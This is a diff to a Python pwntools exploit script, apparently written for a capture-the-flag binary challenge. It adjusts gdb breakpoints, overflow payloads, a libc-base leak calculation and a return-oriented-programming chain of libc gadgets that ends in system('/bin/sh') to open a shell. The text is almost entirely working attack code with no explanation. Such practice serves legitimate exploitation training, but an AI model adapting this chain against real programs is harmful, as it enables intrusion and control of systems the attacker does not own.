@@ -8,17 +8,17 @@ gdb.attach(p, gdbscript='''
            b*save_data+235
 
 b*save_data+329
-           c
-           c
-           c
-           c
-           c
-           c
-           c
-           c
-         c 
+            c
+            c
+            c
+            c
+            c
+            c
+            c
+            c
           c 
-           c
+           c 
+            
            ''')
 read = 0x0000000000401435
 mov_0_edi = 0x000000000040143d
@@ -49,7 +49,7 @@ p.sendafter(b'Data:', payload)
 ###############the second time ###################
 payload = b'a'
 payload = payload.ljust(64 -8-8, b'\x00')
-payload += p64(0x404058)
+payload += p64(0)
 payload += p64(0)
 payload += p64(rw_section2)
 payload += p64(0x0000000000401431)
@@ -57,7 +57,8 @@ p.sendafter(b'Data:',payload )
 ###############the third time ###################
 payload = b'a'
 payload = payload.ljust(64, b'\x00')
-payload +=p64(0x0000000000404308 +0x58)
+payload +=p64(0x404308 +0x58)
+#404308
 payload += p64(to_printf)
 p.sendafter(b'data is saved',payload)
 p.recvuntil(b'saved\n')
@@ -71,11 +72,10 @@ pop_rsi_libc = 0x0000000000029cf1 + libc_base
 pop_rdi_libc = 0x0000000000028265 + libc_base
 pop_rdx_libc = 0x00000000001249da + libc_base
 syscall_libc = 0x000000000002646e + libc_base
-libc_start_main = leak_addr -2254336
 
 
 payload = b'a'
-payload += p64(0x68732f6e69622f)
+payload += p64(0)
 payload = payload.ljust(64 , b'\x00')
 payload += p64(0x0000000000404fc8)
 payload += p64(0x0000000000401431)
@@ -95,7 +95,7 @@ payload += p64(pop_rdi_libc) + p64(bin_sh_libc)
 payload += p64(system_libc)
 payload = payload.ljust(64 , b'\x00')
 payload += p64(0x0000000000404f80)
-payload += p64(0x000000000040148a)
+payload += p64(0x000000000040149f)
 p.send(payload)
 
 
